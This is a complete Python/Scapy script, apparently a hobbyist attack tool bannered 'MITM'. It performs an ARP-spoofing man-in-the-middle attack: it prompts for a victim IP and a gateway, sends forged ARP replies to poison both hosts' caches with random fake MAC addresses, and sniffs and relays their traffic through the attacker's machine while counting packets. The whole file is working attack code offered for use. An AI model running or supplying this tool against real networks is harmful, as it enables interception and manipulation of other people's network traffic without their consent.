#!/usr/bin/env python3
#Created by PepeBigotes

import os, ctypes
try: is_admin = (os.getuid() == 0)
except AttributeError: is_admin = (ctypes.windll.shell32.IsUserAnAdmin() != 0)
if not is_admin:
    print("[!] You need root/admin priviledges to run this script")
    print("    Forgot to use sudo?")
    exit()

try: from scapy.all import *
except ImportError:
    print("[!] You need to have Scapy installed to run this script")
    print("    Try 'pip3 install scapy' or 'sudo apt install python3-scapy'")
    exit()
conf.verb = 0

from time import sleep




os.system('cls' if os.name=='nt' else 'clear')
print("""
 ███╗   ███╗██╗████████╗███╗   ███╗
 ████╗ ████║██║╚══██╔══╝████╗ ████║
 ██╔████╔██║██║   ██║   ██╔████╔██║
 ██║╚██╔╝██║██║   ██║   ██║╚██╔╝██║
 ██║ ╚═╝ ██║██║   ██║   ██║ ╚═╝ ██║
 ╚═╝     ╚═╝╚═╝   ╚═╝   ╚═╝     ╚═╝
 """)



def get_mac_from_ip(i_ip):
    foo = '.'.join(i_ip.split('.')[0:3]) + '.0/24'
    fake_ip = str(RandIP(foo))
    fake_ip = IP(src=fake_ip).src
    pkt = Ether(dst='ff:ff:ff:ff:ff:ff') /\
          ARP(op=1, pdst=i_ip)
    ans = srp1(pkt, timeout=3, retry=-2)
    if not ans: return None
    return ans[ARP].hwsrc


def try_get_mac(ip):
    cached_mac = getmacbyip(ip) # Scapy's func to check ARP cache
    if cached_mac: return cached_mac
    else: mac = get_mac_from_ip(ip) # Send ARP request packet
    if not mac: print(f"[!] Could not get MAC of {ip}"); exit()
    return mac



try:
    TRG_IP = input("Target IP: ") # Target host (Victim)
    TRG_MAC = try_get_mac(TRG_IP)
    print(f"Found target MAC: {TRG_MAC}")
    dst_ip = input("Destination IP (leave blank for default GW): ") # Destination host (GateWay / 2nd Victim)
    if dst_ip == '': DST_IP = conf.route.route('0.0.0.0')[2]
    else: DST_IP = dst_ip
    DST_MAC = try_get_mac(DST_IP)
    print(f"Found destination MAC: {DST_MAC}")
    T_SRC_MAC = str(RandMAC()) # Fake macs for the attacker
    D_SRC_MAC = str(RandMAC())
    print(f"\nRunning MAC {T_SRC_MAC} for {TRG_IP}")
    print(f"Running MAC {D_SRC_MAC} for {DST_IP}\n")
except KeyboardInterrupt:
    print("\nKeyboardInterrupt")
    exit()


pkts_from_trg = 0
pkts_from_dst = 0
pkts_count = 0



def handle_arp(pkt):
    if not pkt.haslayer(ARP): print("[!] Attempted to run handle_arp() on a non-ARP packet"); return
    if pkt[0].src == TRG_MAC and pkt[ARP].pdst == DST_IP: # TRG looking for DST
        global pkts_from_trg; pkts_from_trg += 1
        pkt = Ether(src=D_SRC_MAC, dst=pkt[0].src) /\
              ARP(op=2, hwsrc=D_SRC_MAC, psrc=DST_IP, hwdst=pkt[0].src, pdst=TRG_IP)

    if pkt[0].src == DST_MAC and pkt[ARP].pdst == TRG_IP: # DST looking for TRG
        global pkts_from_dst; pkts_from_dst += 1
        pkt = Ether(src=T_SRC_MAC, dst=pkt[0].src) /\
              ARP(op=2, hwsrc=T_SRC_MAC, psrc=TRG_IP, hwdst=pkt[0].src, pdst=DST_IP)

    sendp(pkt)


def handle_pkt(pkt):
    global pkts_count; pkts_count += 1
    if pkt[0].src not in (TRG_MAC, DST_MAC): return
    if pkt.haslayer(ARP): handle_arp(pkt); return

    if pkt[0].src == TRG_MAC and pkt[0].dst == T_SRC_MAC:
        global pkts_from_trg; pkts_from_trg += 1
        pkt[0].src = D_SRC_MAC
        pkt[0].dst = DST_MAC

    elif pkt[0].src == DST_MAC and pkt[0].dst == D_SRC_MAC:
        global pkts_from_dst; pkts_from_dst += 1
        pkt[0].src = T_SRC_MAC
        pkt[0].dst = TRG_MAC

    else: return

    sendp(pkt)



sniffer = AsyncSniffer(store=0, prn=handle_pkt)
sniffer.start()


pkt1 = Ether(src=D_SRC_MAC, dst=DST_MAC) /\
        ARP(op=2, hwsrc=D_SRC_MAC, psrc=TRG_IP, hwdst=DST_MAC, pdst=DST_IP)
pkt2 = Ether(src=T_SRC_MAC, dst=TRG_MAC) /\
        ARP(op=2, hwsrc=T_SRC_MAC, psrc=DST_IP, hwdst=TRG_MAC, pdst=TRG_IP)

sendp(pkt1)
sendp(pkt2)


try:
    while True:
        print(f"Total {pkts_count} | {pkts_from_trg} from {TRG_IP} | {pkts_from_dst} from {DST_IP}", end='\r')
        sleep(0.5)
except KeyboardInterrupt:
    print("\n\nKeyboardInterrupt")
    sniffer.stop()
    print(f"Got a total of {pkts_from_trg} packets from {TRG_IP} (Target)")
    print(f"And a total of {pkts_from_dst} packets from {DST_IP} (Destination)")
    exit()